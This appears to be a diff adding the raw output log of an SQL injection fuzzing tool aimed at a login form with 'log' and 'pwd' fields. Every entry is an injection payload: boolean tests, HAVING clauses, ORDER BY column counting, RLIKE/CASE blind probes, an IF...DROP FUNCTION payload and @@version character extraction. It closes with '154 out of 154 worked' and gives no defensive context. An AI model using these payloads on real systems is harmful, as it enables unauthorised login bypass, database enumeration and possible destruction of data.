@@ -1,0 +1,463 @@
+[+] -
+[+] - log='OR 1=1&pwd='OR 1=1
+ -
+[+] -
+[+] - log='OR 1=0&pwd='OR 1=0
+ -
+[+] -
+[+] - log='OR x=x&pwd='OR x=x
+ -
+[+] -
+[+] - log='OR x=y&pwd='OR x=y
+ -
+[+] -
+[+] - log='OR 1=1#&pwd='OR 1=1#
+ -
+[+] -
+[+] - log='OR 1=0#&pwd='OR 1=0#
+ -
+[+] -
+[+] - log='OR x=x#&pwd='OR x=x#
+ -
+[+] -
+[+] - log='OR x=y#&pwd='OR x=y#
+ -
+[+] -
+[+] - log='OR 1=1--&pwd='OR 1=1--
+ -
+[+] -
+[+] - log='OR 1=0--&pwd='OR 1=0--
+ -
+[+] -
+[+] - log='OR x=x--&pwd='OR x=x--
+ -
+[+] -
+[+] - log='OR x=y--&pwd='OR x=y--
+ -
+[+] -
+[+] - log='OR 3409=3409 AND ('pytW' LIKE 'pytW&pwd='OR 3409=3409 AND ('pytW' LIKE 'pytW
+ -
+[+] -
+[+] - log='OR 3409=3409 AND ('pytW' LIKE 'pytY&pwd='OR 3409=3409 AND ('pytW' LIKE 'pytY
+ -
+[+] -
+[+] - log='HAVING 1=1&pwd='HAVING 1=1
+ -
+[+] -
+[+] - log='HAVING 1=0&pwd='HAVING 1=0
+ -
+[+] -
+[+] - log='HAVING 1=1#&pwd='HAVING 1=1#
+ -
+[+] -
+[+] - log='HAVING 1=0#&pwd='HAVING 1=0#
+ -
+[+] -
+[+] - log='HAVING 1=1--&pwd='HAVING 1=1--
+ -
+[+] -
+[+] - log='HAVING 1=0--&pwd='HAVING 1=0--
+ -
+[+] -
+[+] - log='AND 1=1&pwd='AND 1=1
+ -
+[+] -
+[+] - log='AND 1=0&pwd='AND 1=0
+ -
+[+] -
+[+] - log='AND 1=1--&pwd='AND 1=1--
+ -
+[+] -
+[+] - log='AND 1=0--&pwd='AND 1=0--
+ -
+[+] -
+[+] - log='AND 1=1#&pwd='AND 1=1#
+ -
+[+] -
+[+] - log='AND 1=0#&pwd='AND 1=0#
+ -
+[+] -
+[+] - log='AND 1=1 AND '%'='&pwd='AND 1=1 AND '%'='
+ -
+[+] -
+[+] - log='AND 1=0 AND '%'='&pwd='AND 1=0 AND '%'='
+ -
+[+] -
+[+] - log='AND 1083=1083 AND (1427=1427&pwd='AND 1083=1083 AND (1427=1427
+ -
+[+] -
+[+] - log='AND 7506=9091 AND (5913=5913&pwd='AND 7506=9091 AND (5913=5913
+ -
+[+] -
+[+] - log='AND 1083=1083 AND ('1427=1427&pwd='AND 1083=1083 AND ('1427=1427
+ -
+[+] -
+[+] - log='AND 7506=9091 AND ('5913=5913&pwd='AND 7506=9091 AND ('5913=5913
+ -
+[+] -
+[+] - log='AND 7300=7300 AND 'pKlZ'='pKlZ&pwd='AND 7300=7300 AND 'pKlZ'='pKlZ
+ -
+[+] -
+[+] - log='AND 7300=7300 AND 'pKlZ'='pKlY&pwd='AND 7300=7300 AND 'pKlZ'='pKlY
+ -
+[+] -
+[+] - log='AND 7300=7300 AND ('pKlZ'='pKlZ&pwd='AND 7300=7300 AND ('pKlZ'='pKlZ
+ -
+[+] -
+[+] - log='AND 7300=7300 AND ('pKlZ'='pKlY&pwd='AND 7300=7300 AND ('pKlZ'='pKlY
+ -
+[+] -
+[+] - log='AS INJECTX WHERE 1=1 AND 1=1&pwd='AS INJECTX WHERE 1=1 AND 1=1
+ -
+[+] -
+[+] - log='AS INJECTX WHERE 1=1 AND 1=0&pwd='AS INJECTX WHERE 1=1 AND 1=0
+ -
+[+] -
+[+] - log='AS INJECTX WHERE 1=1 AND 1=1#&pwd='AS INJECTX WHERE 1=1 AND 1=1#
+ -
+[+] -
+[+] - log='AS INJECTX WHERE 1=1 AND 1=0#&pwd='AS INJECTX WHERE 1=1 AND 1=0#
+ -
+[+] -
+[+] - log='AS INJECTX WHERE 1=1 AND 1=1--&pwd='AS INJECTX WHERE 1=1 AND 1=1--
+ -
+[+] -
+[+] - log='AS INJECTX WHERE 1=1 AND 1=0--&pwd='AS INJECTX WHERE 1=1 AND 1=0--
+ -
+[+] -
+[+] - log='WHERE 1=1 AND 1=1&pwd='WHERE 1=1 AND 1=1
+ -
+[+] -
+[+] - log='WHERE 1=1 AND 1=0&pwd='WHERE 1=1 AND 1=0
+ -
+[+] -
+[+] - log='WHERE 1=1 AND 1=1#&pwd='WHERE 1=1 AND 1=1#
+ -
+[+] -
+[+] - log='WHERE 1=1 AND 1=0#&pwd='WHERE 1=1 AND 1=0#
+ -
+[+] -
+[+] - log='WHERE 1=1 AND 1=1--&pwd='WHERE 1=1 AND 1=1--
+ -
+[+] -
+[+] - log='WHERE 1=1 AND 1=0--&pwd='WHERE 1=1 AND 1=0--
+ -
+[+] -
+[+] - log='ORDER BY 1--&pwd='ORDER BY 1--
+ -
+[+] -
+[+] - log='ORDER BY 2--&pwd='ORDER BY 2--
+ -
+[+] -
+[+] - log='ORDER BY 3--&pwd='ORDER BY 3--
+ -
+[+] -
+[+] - log='ORDER BY 4--&pwd='ORDER BY 4--
+ -
+[+] -
+[+] - log='ORDER BY 5--&pwd='ORDER BY 5--
+ -
+[+] -
+[+] - log='ORDER BY 6--&pwd='ORDER BY 6--
+ -
+[+] -
+[+] - log='ORDER BY 7--&pwd='ORDER BY 7--
+ -
+[+] -
+[+] - log='ORDER BY 8--&pwd='ORDER BY 8--
+ -
+[+] -
+[+] - log='ORDER BY 9--&pwd='ORDER BY 9--
+ -
+[+] -
+[+] - log='ORDER BY 10--&pwd='ORDER BY 10--
+ -
+[+] -
+[+] - log='ORDER BY 11--&pwd='ORDER BY 11--
+ -
+[+] -
+[+] - log='ORDER BY 12--&pwd='ORDER BY 12--
+ -
+[+] -
+[+] - log='ORDER BY 13--&pwd='ORDER BY 13--
+ -
+[+] -
+[+] - log='ORDER BY 14--&pwd='ORDER BY 14--
+ -
+[+] -
+[+] - log='ORDER BY 15--&pwd='ORDER BY 15--
+ -
+[+] -
+[+] - log='ORDER BY 16--&pwd='ORDER BY 16--
+ -
+[+] -
+[+] - log='ORDER BY 17--&pwd='ORDER BY 17--
+ -
+[+] -
+[+] - log='ORDER BY 18--&pwd='ORDER BY 18--
+ -
+[+] -
+[+] - log='ORDER BY 19--&pwd='ORDER BY 19--
+ -
+[+] -
+[+] - log='ORDER BY 20--&pwd='ORDER BY 20--
+ -
+[+] -
+[+] - log='ORDER BY 21--&pwd='ORDER BY 21--
+ -
+[+] -
+[+] - log='ORDER BY 22--&pwd='ORDER BY 22--
+ -
+[+] -
+[+] - log='ORDER BY 23--&pwd='ORDER BY 23--
+ -
+[+] -
+[+] - log='ORDER BY 24--&pwd='ORDER BY 24--
+ -
+[+] -
+[+] - log='ORDER BY 25--&pwd='ORDER BY 25--
+ -
+[+] -
+[+] - log='ORDER BY 26--&pwd='ORDER BY 26--
+ -
+[+] -
+[+] - log='ORDER BY 27--&pwd='ORDER BY 27--
+ -
+[+] -
+[+] - log='ORDER BY 28--&pwd='ORDER BY 28--
+ -
+[+] -
+[+] - log='ORDER BY 29--&pwd='ORDER BY 29--
+ -
+[+] -
+[+] - log='ORDER BY 30--&pwd='ORDER BY 30--
+ -
+[+] -
+[+] - log='ORDER BY 31337--&pwd='ORDER BY 31337--
+ -
+[+] -
+[+] - log='ORDER BY 1#&pwd='ORDER BY 1#
+ -
+[+] -
+[+] - log='ORDER BY 2#&pwd='ORDER BY 2#
+ -
+[+] -
+[+] - log='ORDER BY 3#&pwd='ORDER BY 3#
+ -
+[+] -
+[+] - log='ORDER BY 4#&pwd='ORDER BY 4#
+ -
+[+] -
+[+] - log='ORDER BY 5#&pwd='ORDER BY 5#
+ -
+[+] -
+[+] - log='ORDER BY 6#&pwd='ORDER BY 6#
+ -
+[+] -
+[+] - log='ORDER BY 7#&pwd='ORDER BY 7#
+ -
+[+] -
+[+] - log='ORDER BY 8#&pwd='ORDER BY 8#
+ -
+[+] -
+[+] - log='ORDER BY 9#&pwd='ORDER BY 9#
+ -
+[+] -
+[+] - log='ORDER BY 10#&pwd='ORDER BY 10#
+ -
+[+] -
+[+] - log='ORDER BY 11#&pwd='ORDER BY 11#
+ -
+[+] -
+[+] - log='ORDER BY 12#&pwd='ORDER BY 12#
+ -
+[+] -
+[+] - log='ORDER BY 13#&pwd='ORDER BY 13#
+ -
+[+] -
+[+] - log='ORDER BY 14#&pwd='ORDER BY 14#
+ -
+[+] -
+[+] - log='ORDER BY 15#&pwd='ORDER BY 15#
+ -
+[+] -
+[+] - log='ORDER BY 16#&pwd='ORDER BY 16#
+ -
+[+] -
+[+] - log='ORDER BY 17#&pwd='ORDER BY 17#
+ -
+[+] -
+[+] - log='ORDER BY 18#&pwd='ORDER BY 18#
+ -
+[+] -
+[+] - log='ORDER BY 19#&pwd='ORDER BY 19#
+ -
+[+] -
+[+] - log='ORDER BY 20#&pwd='ORDER BY 20#
+ -
+[+] -
+[+] - log='ORDER BY 21#&pwd='ORDER BY 21#
+ -
+[+] -
+[+] - log='ORDER BY 22#&pwd='ORDER BY 22#
+ -
+[+] -
+[+] - log='ORDER BY 23#&pwd='ORDER BY 23#
+ -
+[+] -
+[+] - log='ORDER BY 24#&pwd='ORDER BY 24#
+ -
+[+] -
+[+] - log='ORDER BY 25#&pwd='ORDER BY 25#
+ -
+[+] -
+[+] - log='ORDER BY 26#&pwd='ORDER BY 26#
+ -
+[+] -
+[+] - log='ORDER BY 27#&pwd='ORDER BY 27#
+ -
+[+] -
+[+] - log='ORDER BY 28#&pwd='ORDER BY 28#
+ -
+[+] -
+[+] - log='ORDER BY 29#&pwd='ORDER BY 29#
+ -
+[+] -
+[+] - log='ORDER BY 30#&pwd='ORDER BY 30#
+ -
+[+] -
+[+] - log='ORDER BY 31337#&pwd='ORDER BY 31337#
+ -
+[+] -
+[+] - log='ORDER BY 1&pwd='ORDER BY 1
+ -
+[+] -
+[+] - log='ORDER BY 2&pwd='ORDER BY 2
+ -
+[+] -
+[+] - log='ORDER BY 3&pwd='ORDER BY 3
+ -
+[+] -
+[+] - log='ORDER BY 4&pwd='ORDER BY 4
+ -
+[+] -
+[+] - log='ORDER BY 5&pwd='ORDER BY 5
+ -
+[+] -
+[+] - log='ORDER BY 6&pwd='ORDER BY 6
+ -
+[+] -
+[+] - log='ORDER BY 7&pwd='ORDER BY 7
+ -
+[+] -
+[+] - log='ORDER BY 8&pwd='ORDER BY 8
+ -
+[+] -
+[+] - log='ORDER BY 9&pwd='ORDER BY 9
+ -
+[+] -
+[+] - log='ORDER BY 10&pwd='ORDER BY 10
+ -
+[+] -
+[+] - log='ORDER BY 11&pwd='ORDER BY 11
+ -
+[+] -
+[+] - log='ORDER BY 12&pwd='ORDER BY 12
+ -
+[+] -
+[+] - log='ORDER BY 13&pwd='ORDER BY 13
+ -
+[+] -
+[+] - log='ORDER BY 14&pwd='ORDER BY 14
+ -
+[+] -
+[+] - log='ORDER BY 15&pwd='ORDER BY 15
+ -
+[+] -
+[+] - log='ORDER BY 16&pwd='ORDER BY 16
+ -
+[+] -
+[+] - log='ORDER BY 17&pwd='ORDER BY 17
+ -
+[+] -
+[+] - log='ORDER BY 18&pwd='ORDER BY 18
+ -
+[+] -
+[+] - log='ORDER BY 19&pwd='ORDER BY 19
+ -
+[+] -
+[+] - log='ORDER BY 20&pwd='ORDER BY 20
+ -
+[+] -
+[+] - log='ORDER BY 21&pwd='ORDER BY 21
+ -
+[+] -
+[+] - log='ORDER BY 22&pwd='ORDER BY 22
+ -
+[+] -
+[+] - log='ORDER BY 23&pwd='ORDER BY 23
+ -
+[+] -
+[+] - log='ORDER BY 24&pwd='ORDER BY 24
+ -
+[+] -
+[+] - log='ORDER BY 25&pwd='ORDER BY 25
+ -
+[+] -
+[+] - log='ORDER BY 26&pwd='ORDER BY 26
+ -
+[+] -
+[+] - log='ORDER BY 27&pwd='ORDER BY 27
+ -
+[+] -
+[+] - log='ORDER BY 28&pwd='ORDER BY 28
+ -
+[+] -
+[+] - log='ORDER BY 29&pwd='ORDER BY 29
+ -
+[+] -
+[+] - log='ORDER BY 30&pwd='ORDER BY 30
+ -
+[+] -
+[+] - log='ORDER BY 31337&pwd='ORDER BY 31337
+ -
+[+] -
+[+] - log='RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='&pwd='RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+ -
+[+] -
+[+] - log='RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='&pwd='RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+ -
+[+] -
+[+] - log='IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--&pwd='IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
+ -
+[+] -
+[+] - log='IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--&pwd='IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
+ -
+[+] -
+[+] - log='% AND 8310=8310 AND '%'='&pwd='% AND 8310=8310 AND '%'='
+ -
+[+] -
+[+] - log='% AND 8310=8311 AND '%'='&pwd='% AND 8310=8311 AND '%'='
+ -
+[+] -
+[+] - log='and (select substring(@@version,1,1))='X'&pwd='and (select substring(@@version,1,1))='X'
+ -
+[+] -
+[+] - log='and (select substring(@@version,1,1))='M'&pwd='and (select substring(@@version,1,1))='M'
+ -
+[+] -
+[+] - log='and (select substring(@@version,2,1))='i'&pwd='and (select substring(@@version,2,1))='i'
+ -
+[+] -
+[+] - log='and (select substring(@@version,2,1))='y'&pwd='and (select substring(@@version,2,1))='y'
+ -
+[+] -
+[+] - log='and (select substring(@@version,3,1))='c'&pwd='and (select substring(@@version,3,1))='c'
+ -
+[+] -
+[+] - log='and (select substring(@@version,3,1))='S'&pwd='and (select substring(@@version,3,1))='S'
+ -
+[+] -
+[+] - log='and (select substring(@@version,3,1))='X'&pwd='and (select substring(@@version,3,1))='X'
+ -
+[*] 154 out of 154 worked
